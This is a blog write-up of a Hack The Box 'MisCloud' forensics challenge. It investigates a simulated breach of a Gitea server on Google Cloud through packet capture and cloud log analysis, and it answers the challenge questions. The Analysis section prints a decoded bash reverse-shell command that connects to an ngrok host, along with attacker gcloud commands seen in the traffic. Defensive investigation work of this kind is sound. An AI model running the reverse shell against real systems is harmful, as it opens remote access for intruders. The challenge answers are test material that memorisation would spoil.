---
title: "HTB Sherlock: MisCloud"
seoTitle: "Hack The Box Sherlock - MisCloud write-up"
seoDescription: "PCAP analysis, data recovery, forensics. Google Cloud Services."
datePublished: Fri Apr 11 2025 09:00:12 GMT+0000 (Coordinated Universal Time)
cuid: cm9ck3qxp000f09jy3t9d20v8
slug: htb-sherlock-miscloud
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1744235278972/dfe19686-c7a5-4979-be1f-2b82157ef8bd.png
tags: google-cloud, hackthebox, pcap, dfir, pivoting

---

<div data-node-type="callout">
<div data-node-type="callout-emoji">💡</div>
<div data-node-type="callout-text">This write-up is a part of the <a target="_self" rel="noopener noreferrer nofollow" href="https://blog.cyberethical.me/series/htb-sherlocks" style="pointer-events: none">HTB Sherlocks series</a>. Sherlocks are investigative challenges that test defensive security skills. I encourage you to try them out if you like digital forensics, incident response, post-breach analysis and malware analysis. <a target="_self" rel="noopener noreferrer nofollow" href="https://blog.cyberethical.me/go-htbapp" style="pointer-events: none">Are you ready to start the investigation?</a></div>
</div>

# Incident Details

Name: [MisCloud](https://blog.cyberethical.me/go-htbapp)  
Category: DFIR  
Difficulty: Medium ([*Solved*](https://labs.hackthebox.com/achievement/sherlock/555018/759))

> My name is John. I am a student who started an e-commerce startup business named "DummyExample" with my partner, James. Initially, I was using WordPress and shared hosting. After experiencing good traffic, I decided to migrate from WordPress to a customized website on Google Cloud Platform (GCP). Currently, my partner and I are working on the website, contributing to a Gitea server hosted on GCP. I migrated all customer data to cloud storage. Recently, my data was breached, and I have no clue how it happened or what was vulnerable. My GCP infrastructure consists of five VM instances and a single Cloud Storage. There is one Windows machine for my partner to use, with very restricted permissions over GCP, only allowing access to his Gitea account. I have two Linux machines for my work, one for hosting the Gitea server and another for packet mirroring. All the machines have public IPs but very restricted access due to firewalls in place. Due to budget constraints, I can't use the Google Security Command Center service, so I am providing you with the VPC network traffic capture and the Google Cloud logs.

%%[support-cta] 

# Evidences

```plaintext
> get-fileHash  *

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
SHA256          52645C94618E364F52D33E090A03E73967C907CF5BD2F3FF1851DAF84EBFB9D0       GCloud_Logs.json
SHA256          F4E3AC83B3478E976148F1788C407547A841D529F2E6611DE46EBB210829DBAB       miscloud.zip
SHA256          E233A076D1830B5E8E83FDF82E9888A0B1A9F27B642D79467BB910DC5C3B5D83       VPCNetwork_Traffic.pcap
```

# Analysis

Pretty nice description from our buddy John here 👍. Here is the initial map of the servers I've created.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1744230505867/536ccf1e-1fd7-41b3-aa2a-2e62bda38e6d.png align="center")

Quick PCAP statistics in Wireshark:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1744230579647/b9241516-4c46-47a9-b034-85e1805fccf7.png align="center")

We have some heavy TCP traffic, including TLS and SSH. Possible sensitive data exfiltration.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1744230670399/cd4812a8-5071-41ba-8d74-e6835fbed629.png align="center")

These are probably IPs of the servers (`10.*.*.*` private subnet). There is one another IP being a destination of a single packet.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1744230807615/b159385e-31d4-4e1d-82e0-c140b2dc2dd3.png align="center")

`*.*.*.255` is a broadcast IP and packet is a [HostAnnouncement Browser Frame](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-brws/10536677-8a14-4726-bc52-c0ef39cb7130). And it looks like we got a log from the Windows 10 Server (`10.128.0.3`)

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1744230915868/bcfd33ac-a431-400a-91d2-00c5faf90b3e.png align="center")

John’s credentials to the Gitea service.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1744231122008/0d32962a-318e-44aa-9df1-7c98ea35930f.png align="center")

In one of the first packages, we can see the version of Gitea used (`1.2.0`).

In packet 20213 suspicious response can be seen:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1744231211218/1babdc3e-34f4-477c-b6f1-da9966667617.png align="center")

Hmm, the whole traffic there looks suspicious.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1744231303611/2c479401-e221-426e-aa6e-1eaa83cf0be2.png align="center")

It seems like a threat actor uses some kind of vulnerability in Git or Gitea to expose the files on the server (like `cusdata.xlsx.enc`).

Another packet looks like an RCE.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1744231744039/0e3cd6cb-7863-40ff-87ed-1b9b9bc70abe.png align="center")

Decoded base64 (reverse shell): `bash -i >& /dev/tcp/`[`0.tcp.eu.ngrok.io/14509`](http://0.tcp.eu.ngrok.io/14509) `0>&1 &`

# Questions

## 01\. What's the private IP address of the Windows machine?

Seen in the broadcast message: `10.128.0.3`.

## 02\. Which CVE was exploited by the threat actor?

Searching for the “Gitea 1.2.0 vulnerabilities” I landed at the CVEdetails

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1744231706666/e09fa987-0f8f-4de8-b477-81c896e26315.png align="center")

Because I’ve already seen the RCE I’m looking at those four from code executions category. This one looks like what we have here.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1744232295141/ee67f23e-e999-4423-a06a-d1d42c65095f.png align="center")

## 03\. What is the hostname and port number to which the reverse shell was connecting?

Already discovered: `0.tcp.eu.ngrok.io:14509`

## 04\. From which IP address was the CVE exploited, and is this threat an insider or outsider attack?

Packet from which the revshell request originates from is sourced at `10.128.0.3`. And it’s a private address, so “inside job”.

## 05\. Which account helped the threat actor to pivot?

Let’s browse the revshell communication.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1744232535772/8f1c7af6-5bd9-41ed-96ed-02440bd17b96.png align="center")

Here we can see the commands and responses in plaintext.

Packet 13385:  
`gcloud auth list`

Packet 13392:

```plaintext
                  Credentialed Accounts
ACTIVE  ACCOUNT
*       257145238219-compute@developer.gserviceaccount.com
```

## 06\. Which machines did the threat actor log into? (sorted alphabetically)

That requires more revshell analysis. At some point, we can see that threat actor creates an `id_rsa` key for SSH purposes and continues from the SSH (revshell traffic gets quieter).

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1744233124069/018812eb-a8f4-46ac-bbf4-2ec1c77ece70.png align="center")

Because question asks which machines being **logged into** - that is safely to assume that apart from “current” system (`10.128.0.4` as stated in the revshell packets) there are other SSHed servers.  
`ip.src == 10.128.0.4 && ssh && ssh.protocol == "SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3"`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1744233269871/cb058000-3802-4f4e-8b25-168f3bce4056.png align="center")

Other revshell packet exposes all machines’ IPs.

```plaintext
$ gcloud compute instances list
NAME                    ZONE           MACHINE_TYPE  PREEMPTIBLE  INTERNAL_IP  EXTERNAL_IP    STATUS
gitea-vm                us-central1-a  e2-medium                  10.128.0.4   34.66.191.87   RUNNING
linux-machine1          us-central1-a  e2-medium                  10.128.0.7   34.42.164.212  RUNNING
linux-machine2          us-central1-a  e2-medium                  10.128.0.2   34.172.179.63  RUNNING
packet-mirror-instance  us-central1-a  e2-medium                  10.128.0.5   34.28.192.153  RUNNING
windows-machine         us-central1-a  e2-medium                  10.128.0.3   34.45.236.159  RUNNING
```

Unfortunately, `gitea-vm` is not accepted in the answer, despite being the first one in the chain - so the correct answer is  
`linux-machine1,linux-machine2,packet-mirror-instance`

## 07\. What's the original name of the sensitive file?

From the included Google Cloud Services logs:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1744233521552/6a4e65f1-735b-45dd-a44f-097990d6a120.png align="center")

## 08\. Which gcloud role did the threat actor try to assign to the storage bucket to make it publicly accessible?

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1744233582487/0792709d-2263-474c-acb2-842a9258f7ec.png align="center")

## 09\. Which account led to the cloud storage data breach?

Searching for the exfiltrated file, leads to the `principalEmail`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1744233758395/443fd75e-b1b4-4ce7-9347-d2d056efe2b9.png align="center")

## 10\. Which port number was exploited by the attacker to exfiltrate data that is allowed by default ingress traffic rules in the default VPC network?

I think this one was already found as well in the packet 20213 - `3389` (it is default RDP port).

## 11\. What is the key to decrypt the encrypted file?

%%[follow-cta] 

This one is a bit of guessing… but it is what it is. HTTP Packet 18001 contains a Python script that was used to encrypt the file:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1744234464983/c48c28f1-e5f2-45c4-a2bd-4a2a8b519885.png align="center")

Another packet, 22604 contains the encrypted binary, which can be saved using **File** &gt; **Export** &gt; **HTTP object**.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1744234644589/f2191386-1063-412c-b2a6-3be3517e2022.png align="center")

When looking closer at the header of the file, it can easily be seen a repeatable phrase that could be an encryption key. After a couple tries, the platform accepts the correct answer.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1744234735739/b784af56-0fb3-48f1-97e8-71dd9c43e7f2.png align="center")

## 12\. What are the SSN and credit card numbers of "Founder John"?

Now that we have the encryption key, encryption method (symmetrical XOR) and encrypted data, we can put all of those together in CyberChef and get the decrypted spreadsheet.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1744234818424/61402880-34c1-46b4-8a11-6284e9109024.png align="center")

The file then (so it won’t run it locally) can be previewed, for example on [https://filehelper.com/formats/xlsx](https://filehelper.com/formats/xlsx).

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1744234890185/091af803-3e32-4e4a-a2b0-2ad325a6c809.png align="center")

## 13, 14, 15

Last three questions are knowledge questions, answers for them can be Googled.